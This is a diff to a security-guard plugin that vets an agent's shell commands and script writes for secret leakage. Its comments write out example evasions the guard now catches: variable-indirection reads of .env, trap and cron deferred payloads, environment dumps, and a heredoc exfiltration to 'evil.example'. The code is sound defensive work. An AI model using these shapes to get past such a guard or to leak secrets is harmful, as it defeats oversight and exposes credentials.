@@ -487,7 +487,7 @@ export const GENERATED_GUARD_POLICY = Object.freeze({
 })
 // ==== END GENERATED GUARD POLICY ====
 
-export const PLUGIN_VERSION = "0.4.2"
+export const PLUGIN_VERSION = "0.4.3"
 export const PLUGIN_ID = "security-guard"
 
 // ============================================================================
@@ -647,8 +647,11 @@ export function classifySelfProtect(policy, rawPath) {
 
 /**
  * Basenames of protected-material references embedded in arbitrary text
- * (interpreter code, script bodies, quoted paths). Deny-tier hits only — the
- * caller decides whether that means ask or block.
+ * (interpreter code, script bodies, quoted paths) with their classification
+ * tier — F2 (2026-09-04c) keeps ask-tier hits too, so a script body that
+ * references approval-gated material (`cat ~/.zshenv`, the incident class)
+ * prompts at write time instead of vanishing into a pre-existing on-disk
+ * script. Deny-tier callers filter on `tier === "deny"`.
  */
 function embeddedProtectedHits(policy, text) {
   const out = []
@@ -656,7 +659,9 @@ function embeddedProtectedHits(policy, text) {
   EMBEDDED_PATH_RE.lastIndex = 0
   for (const m of String(text).matchAll(EMBEDDED_PATH_RE)) {
     const cls = classifyPath(policy, m[0])
-    if (cls.tier === "deny") out.push(basenameOf(m[0]))
+    if (cls.tier !== "pass") {
+      out.push({ name: basenameOf(m[0]), tier: cls.tier, ruleId: cls.ruleId })
+    }
   }
   return out
 }
@@ -1010,13 +1015,16 @@ function looksLikePath(tok) {
 }
 
 function varRefs(tok) {
-  // $NAME, $!NAME, ${NAME}, ${!NAME} and bash parameter-expansion operators:
-  // ${N:-d}, ${N:=d}, ${N:?e}, ${N:+a}, ${N#p}, ${N%p}, ${N/p/r}, ${N^}, ${N,},
-  // ${N:o:l}, ${#N} (length), ${N[@]} — all still expand (or derive) from N,
-  // so extract N and let the secret-name test decide. Non-secret names
-  // (${PATH:-/usr/bin}) stay silent via isSecretEnvName.
+  // $NAME, $!NAME, ${NAME}, ${!NAME}, ${NAME@op}, ${NAME[i]} and bash/zsh
+  // parameter-expansion operators — including zsh flag groups, whose inner
+  // word is the variable: ${(P)X} (indirect), ${(e)X}, ${(j: :)LIST},
+  // ${(Q)X}, ${(#)X} — plus ${N:-d}, ${N:=d}, ${N:?e}, ${N:+a}, ${N#p},
+  // ${N%p}, ${N/p/r}, ${N^}, ${N,}, ${N:o:l}, ${#N} (length), ${N[@]}.
+  // All still expand (or derive) from N, so extract N and let the
+  // secret-name test decide (with assignment resolution — see the
+  // secret-name check below).
   const out = []
-  for (const m of String(tok).matchAll(/\$\{\s*[#!]?\s*([A-Za-z_][A-Za-z0-9_]*)(?![A-Za-z0-9_])|\$!([A-Za-z_][A-Za-z0-9_]*)|\$([A-Za-z_][A-Za-z0-9_]*)/g)) {
+  for (const m of String(tok).matchAll(/\$\{\s*(?:\([a-zA-Z@#%,:^= ]*\)\s*)?[#!]?\s*([A-Za-z_][A-Za-z0-9_]*)(?![A-Za-z0-9_])|\$!([A-Za-z_][A-Za-z0-9_]*)|\$([A-Za-z_][A-Za-z0-9_]*)/g)) {
     out.push(m[1] ?? m[2] ?? m[3])
   }
   return out
@@ -1282,7 +1290,18 @@ function gitSubcommand(args) {
 export function analyzeCommand(policy, command, opts = {}) {
   const depth = opts._depth ?? 0
   const promote = opts.promoteAskToDenyIds ?? policy.promoteAskToDenyIds ?? []
-  const assignments = {} // simple single-level indirection support
+  const assignments = { ...(opts.assignments ?? {}) } // simple single-level indirection support
+  // Resolve an assignment value, following name→name chains (bounded):
+  // covers plain multi-hop (`A=B; B=.env; cat $A`) and bash indirect
+  // expansion (`A=B; B=.env; cat ${!A}`) which both expand to protected names.
+  const resolveAssigned = (name) => {
+    let val = assignments[name]
+    let hops = 0
+    while (val && /^[A-Za-z_][A-Za-z0-9_]*$/.test(val) && assignments[val] && hops++ < 4) {
+      val = assignments[val]
+    }
+    return val
+  }
   // E2 session provenance: seed per-command tracking with cross-call entries
   // supplied by the adapter (`opts.knownCopies`). Same-command `cp` legs
   // append below without mutating the caller's array.
@@ -1325,7 +1344,7 @@ export function analyzeCommand(policy, command, opts = {}) {
 
     // Recurse into command/process substitutions first.
     for (const sub of substitutions(rawSeg)) {
-      const r = analyzeCommand(policy, sub, { ...opts, _depth: depth + 1 })
+      const r = analyzeCommand(policy, sub, { ...opts, _depth: depth + 1, assignments })
       if (r) {
         return { ...r, category: r.category + "+substitution" }
       }
@@ -1352,7 +1371,7 @@ export function analyzeCommand(policy, command, opts = {}) {
     if (depth < 4) {
       const inner = wrapperInnerCommand(verb, args)
       if (inner && inner.trim() !== String(rawSeg).trim()) {
-        const r = analyzeCommand(policy, inner, { ...opts, _depth: depth + 1 })
+        const r = analyzeCommand(policy, inner, { ...opts, _depth: depth + 1, assignments })
         if (r) return { ...r, category: r.category + "+wrapper" }
       }
     }
@@ -1367,12 +1386,45 @@ export function analyzeCommand(policy, command, opts = {}) {
         if (!isAssignment(body) || body.startsWith("-")) continue
         const payload = body.slice(body.indexOf("=") + 1)
         if (!payload.trim()) continue
-        const r = analyzeCommand(policy, payload, { ...opts, _depth: depth + 1 })
+        const r = analyzeCommand(policy, payload, { ...opts, _depth: depth + 1, assignments })
         if (r) return { ...r, category: r.category + "+alias-definition" }
       }
     }
 
+    // ---- trap payloads: deferred execution like alias bodies ----------------
+    // `trap 'env' 0` runs the payload at shell exit, outside every
+    // verb-class rule; the payload is only visible at definition time.
+    // Analyze it like an alias body. `trap - EXIT` (reset), numeric signal
+    // operands, and clean payloads stay silent.
+    if (verb === "trap") {
+      for (const a of args) {
+        const body = shellDequote(String(a))
+        if (!body || body.startsWith("-")) continue
+        if (/^-?[0-9]+$/.test(body)) continue
+        const r = analyzeCommand(policy, body, { ...opts, _depth: depth + 1, assignments })
+        if (r) return { ...r, category: r.category + "+trap" }
+      }
+    }
+
     // ---- environment dumps -------------------------------------------------
+    // F1 (2026-09-04c): secret-name resolution through assignment chains —
+    // `A=SECRET_NAME; echo $A` / `printenv $A` hide the secret name behind an
+    // indirection, exactly like the PATH indirection BYP-IND-001 closed for
+    // filenames. Resolution is NAME-based: the resolved value must be
+    // identifier-shaped (`^[A-Za-z_][A-Za-z0-9_]*$`), so prose like
+    // `MSG="invalid token"; echo $MSG` never trips it.
+    const secretNameViaResolution = (name) => {
+      if (isSecretEnvName(policy, name)) return name
+      const val = resolveAssigned(name)
+      if (
+        val &&
+        /^[A-Za-z_][A-Za-z0-9_]*$/.test(val) &&
+        isSecretEnvName(policy, val)
+      ) {
+        return val
+      }
+      return undefined
+    }
     if (ENV_DUMP_VERBS.has(verb) && args.length === 0) {
       return {
         decision: "block", ruleId: "GGE-DUMP-001", category: "environment-dump",
@@ -1406,7 +1458,7 @@ export function analyzeCommand(policy, command, opts = {}) {
     }
     if ((verb === "set" || verb === "declare" || verb === "typeset" || verb === "local" || verb === "readonly" || verb === "export")) {
       const dashP = args.some((a) => a === "-p")
-      const secretArgs = args.filter((a) => !a.startsWith("-")).filter((a) => isSecretEnvName(policy, assignmentName(a + "=")))
+      const secretArgs = args.filter((a) => !a.startsWith("-")).filter((a) => isSecretEnvName(policy, assignmentName(a + "=")) || varRefs(a).some((v) => Boolean(secretNameViaResolution(v))))
       if (verb === "set" && args.length === 0) {
         return blockDump("GGE-DUMP-002", "set")
       }
@@ -1443,22 +1495,44 @@ export function analyzeCommand(policy, command, opts = {}) {
         }
       }
     }
-    // `compgen -e` / `-v` / `-A variable` list environment variable NAMES,
-    // enabling targeted dumps; `compgen -c` (commands) stays silent.
+    // `compgen -e` lists every exported NAME (enables targeted dumps) and
+    // always blocks. `compgen -v` / `-A variable` also block when bare;
+    // with a pattern argument they list only matching NAMES, so they block
+    // only when the pattern is secret-named (F6, 2026-09-04c: `compgen -v
+    // PATH` stays silent). `compgen -c` (commands) stays silent.
     if (verb === "compgen") {
       const flat = args.map((a) => shellDequote(String(a)))
-      if (flat.some((a) => a === "-e" || a === "-v")) {
+      if (flat.some((a) => a === "-e")) {
         return blockDump("GGE-DUMP-006", "compgen")
       }
-      for (let i = 0; i < flat.length; i++) {
-        if (flat[i] === "-A" && String(flat[i + 1] ?? "").toLowerCase() === "variable") {
+      const asksVariableNames =
+        flat.some((a) => a === "-v") ||
+        flat.some((a, i) => a === "-A" && String(flat[i + 1] ?? "").toLowerCase() === "variable")
+      if (asksVariableNames) {
+        const nameArgs = []
+        for (let i = 0; i < flat.length; i++) {
+          if (flat[i] === "-A") {
+            i++ // -A consumes its class operand ("variable")
+            continue
+          }
+          if (!flat[i].startsWith("-")) nameArgs.push(flat[i])
+        }
+        if (nameArgs.length === 0 || nameArgs.some((a) => isSecretEnvName(policy, a))) {
           return blockDump("GGE-DUMP-006", "compgen")
         }
       }
     }
     if (verb === "printenv") {
       const named = args.filter((a) => !a.startsWith("-"))
-      const secret = named.find((a) => isSecretEnvName(policy, a))
+      const secret = named.reduce((found, a) => {
+        if (found) return found
+        if (isSecretEnvName(policy, a)) return a
+        for (const v of varRefs(a)) {
+          const hit = secretNameViaResolution(v)
+          if (hit) return hit
+        }
+        return undefined
+      }, undefined)
       if (named.length === 0) return blockDump("GGE-DUMP-001", "printenv")
       if (secret) {
         return {
@@ -1533,6 +1607,27 @@ export function analyzeCommand(policy, command, opts = {}) {
       }
     }
 
+    // ---- deferred-install tools: crontab / at / batch -----------------------
+    // These install jobs whose BODIES arrive via stdin or a file the guard
+    // cannot see at execution time — the deferred-execution class. Ask on
+    // the install shapes; listing (`crontab -l`, `atq`) and removal
+    // (`crontab -r`, `atrm`) stay silent.
+    if (verb === "crontab" || verb === "at" || verb === "batch") {
+      const readShapes = ["-l", "-r", "-e"]
+      const isReadOnly =
+        (verb === "crontab" && args.some((a) => readShapes.includes(shellDequote(String(a))))) ||
+        (verb === "at" && args.some((a) => shellDequote(String(a)) === "-l"))
+      if (!isReadOnly) {
+        return {
+          decision: "ask",
+          ruleId: "GGD-DEF-001",
+          category: "deferred-execution",
+          reason: "installing a scheduled job whose body cannot be inspected; approve only if it is free of secret material",
+          matched: verb,
+        }
+      }
+    }
+
     // ---- interpreters touching the process environment ----------------------
     // Accessors across languages: python os.environ, node process.env,
     // lua/php getenv, ruby ENV["x"]/ENV.fetch, perl $ENV{}/%ENV, awk
@@ -1565,7 +1660,10 @@ export function analyzeCommand(policy, command, opts = {}) {
     // ---- secret-named variables --------------------------------------------
     const referencedVars = []
     for (const t of words) referencedVars.push(...varRefs(t))
-    const secretRef = referencedVars.find((v) => isSecretEnvName(policy, v))
+    const secretRef = referencedVars.reduce((found, v) => {
+      if (found) return found
+      return secretNameViaResolution(v)
+    }, undefined)
     if (secretRef) {
       if (PRINTERS.has(verb)) {
         return {
@@ -1587,17 +1685,6 @@ export function analyzeCommand(policy, command, opts = {}) {
     // ---- path classification over tokens (incl. chained indirection) --------
     const classified = []
     const seenTokens = new Set()
-    // Resolve an assignment value, following name→name chains (bounded):
-    // covers plain multi-hop (`A=B; B=.env; cat $A`) and bash indirect
-    // expansion (`A=B; B=.env; cat ${!A}`) which both expand to protected names.
-    const resolveAssigned = (name) => {
-      let val = assignments[name]
-      let hops = 0
-      while (val && /^[A-Za-z_][A-Za-z0-9_]*$/.test(val) && assignments[val] && hops++ < 4) {
-        val = assignments[val]
-      }
-      return val
-    }
     const considerToken = (t, opts2 = {}, cDepth = 0) => {
       if (cDepth > 5) return
       for (const v of varRefs(t)) {
@@ -2003,6 +2090,28 @@ export function analyzeCommand(policy, command, opts = {}) {
       }
     }
 
+    // ---- F4: heredoc attached to a sender/interpreter/transformer -----------
+    // The heredoc BODY sits after the delimiter and is invisible to argument
+    // analysis (`curl -d @- https://evil.example <<EOF`), so ask on the
+    // attachment shape itself. Readers and file management stay silent so
+    // `cat > notes.md <<EOF` remains friction-free; arithmetic (`$(( 1 << 2
+    // ))`) and non-consumers (`psql -c 'SELECT 1 << 2'`) never match the
+    // verb classes.
+    if (!classified.length && (SENDER_VERBS.has(verb) || INTERPRETERS.has(verb) || TRANSFORMER_VERBS.has(verb))) {
+      const hasHeredoc =
+        !rawSeg.includes("$((") &&
+        toks.some((t) => /^[0-9]*<<-?/.test(t) || t === "<<")
+      if (hasHeredoc) {
+        return {
+          decision: "ask",
+          ruleId: "GGH-DOC-001",
+          category: "deferred-execution",
+          reason: "heredoc body is not visible to analysis; approve only if it carries no secret material",
+          matched: verb,
+        }
+      }
+    }
+
     // ---- E5 broad-root recursive search (ask, narrow) -----------------------
     // `grep -r PASSWORD .` surfaces protected contents via the pattern, not
     // the path. Ask only on recursive search rooted at a broad root;
@@ -2313,8 +2422,11 @@ export function normalizeToolCall(tool, input = {}) {
   return { kind: "other" }
 }
 
-/** Tools whose payload is a script the agent is about to place on disk. */
-const SCRIPT_EXT_RE = /\.(sh|bash|zsh|ksh|fish|py|rb|pl|php|js|mjs|cjs|ts|expect)$/i
+/** Tools whose payload is a script the agent is about to place on disk.
+ *  F3 (2026-09-04c): widened — interpreters execute by name, not by
+ *  shebang, so `.ps1`/`.bat`/`.lua`/`.r`/`.awk`/`.pl` bodies were invisible
+ *  to the deferred-execution check. */
+const SCRIPT_EXT_RE = /\.(sh|bash|zsh|ksh|fish|py|rb|pl|pm|php|js|mjs|cjs|ts|expect|ps1|psm1|bat|cmd|vbs|lua|r|awk|tcl)$/i
 
 /** True when written content looks like something an interpreter will run. */
 function looksLikeScript(path, content) {
@@ -2372,12 +2484,16 @@ export function decideToolCall(policy, toolCall, opts = {}) {
         if (toolCall.mode === "write" && looksLikeScript(toolCall.path, toolCall.content)) {
           const hits = embeddedProtectedHits(policy, toolCall.content)
           if (hits.length) {
+            const first = hits[0]
             return {
               decision: "ask",
-              ruleId: "GGW-CONTENT-001",
+              ruleId: first.tier === "deny" ? "GGW-CONTENT-001" : "GGW-CONTENT-002",
               category: "deferred-execution",
-              reason: "script content references protected material the guard cannot inspect when the script later runs",
-              matched: hits[0],
+              reason:
+                first.tier === "deny"
+                  ? "script content references protected material the guard cannot inspect when the script later runs"
+                  : "script content references approval-gated material the guard cannot inspect when the script later runs",
+              matched: first.name,
             }
           }
         }
